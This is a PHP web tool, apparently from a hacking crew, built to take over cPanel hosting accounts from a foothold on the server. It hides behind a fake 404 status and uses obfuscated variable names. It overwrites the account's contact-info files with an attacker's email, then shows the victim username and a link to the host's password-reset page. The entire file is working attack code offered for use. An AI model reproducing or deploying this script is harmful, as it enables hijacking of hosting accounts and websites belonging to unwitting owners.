<?php 
error_reporting(0);
header("HTTP/1.0 404 Not Found");
echo '<!DOCTYPE HTML>
<html>
<head>
<title>Cpanel Reset Password</title>
<style type="text/css">
html {
    margin: 20px auto;
    background: #000000;
    color: green;
    text-align: center;
}
header {
    color: green;
    margin: 10px auto;
}
input[type=password] {
    width: 250px;
    height: 25px;
    color: red;
    background: transparent;
    border: 1px dotted green;
    margin-left: 20px;
    text-align: center;
}
a {
    text-decoration: none;
    color: green;
}
</style> 	
</head>
<center>
<header>
    <pre>

    /$$$$$                                                       /$$   /$$                      /$$$$$$           
   |__  $$                                                      | $$  | $$                     /$$$_  $$          
      | $$  /$$$$$$  /$$$$$$/$$$$  /$$    /$$ /$$$$$$  /$$$$$$$ | $$  | $$  /$$$$$$  /$$   /$$| $$$$\ $$  /$$$$$$ 
      | $$ |____  $$| $$_  $$_  $$|  $$  /$$/|____  $$| $$__  $$| $$$$$$$$ |____  $$|  $$ /$$/| $$ $$ $$ /$$__  $$
 /$$  | $$  /$$$$$$$| $$ \ $$ \ $$ \  $$/$$/  /$$$$$$$| $$  \ $$| $$__  $$  /$$$$$$$ \  $$$$/ | $$\ $$$$| $$  \__/
| $$  | $$ /$$__  $$| $$ | $$ | $$  \  $$$/  /$$__  $$| $$  | $$| $$  | $$ /$$__  $$  >$$  $$ | $$ \ $$$| $$      
|  $$$$$$/|  $$$$$$$| $$ | $$ | $$   \  $/  |  $$$$$$$| $$  | $$| $$  | $$|  $$$$$$$ /$$/\  $$|  $$$$$$/| $$      
 \______/  \_______/|__/ |__/ |__/    \_/    \_______/|__/  |__/|__/  |__/ \_______/|__/  \__/ \______/ |__/      

    - Cpanel Reset Password - Code by JamvanHax0r -
    [#] BlackHat Cyber Crew [#]
 
    </pre>
</header>
</center>
<form action="#" method="post"> 	
<input type="email" name="email" placeholder="Email kalian" /> 	
<input type="submit" name="submit" value="Crot"/> 	
</form> 	 	
<br/><br/><br/> 	
</p>'; ?> 
<?php
$IIIIIIIIIIII = get_current_user(); 
$IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; 
$IIIIIIIIIIlI = getenv('REMOTE_ADDR'); 
if (isset($_POST['submit'])) { $email = $_POST['email']; 
$IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); 
$IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; 
$IIIIIIIIIlI1 = "2083"; 
$IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1';
$read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo');
if(!$read_named_conf)
{
echo "<h1>Gak bisa diakses asw</h1><br><br> </pre></center>"; 
}
else
{
echo "<center>Ini username target, salin lalu crot <br><br></center>"; 
echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin Username</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; 
echo '<br/><center><a  target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Crot Disini</a><br><br></center>'; ;}} ?>
</div> 
</div>
</center> 
</body> 
</html>
